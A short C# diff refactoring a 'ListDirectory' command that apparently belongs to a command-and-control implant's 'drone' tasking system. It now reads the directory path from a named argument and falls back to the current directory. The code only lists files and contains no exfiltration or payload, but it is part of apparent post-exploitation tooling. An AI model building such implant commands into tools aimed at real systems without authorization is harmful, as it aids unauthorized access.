@@ -1,6 +1,5 @@
 ﻿using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -13,10 +12,9 @@ public sealed class ListDirectory : DroneCommand
 
     public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        var path = task.Arguments.Any()
-            ? task.Arguments[0]
-            : Directory.GetCurrentDirectory();
-        
+        if (!task.Arguments.TryGetValue("path", out var path))
+            path = Directory.GetCurrentDirectory();
+
         List<DirectoryEntry> results = new();
         
         results.AddRange(GetDirectoryInfo(path));
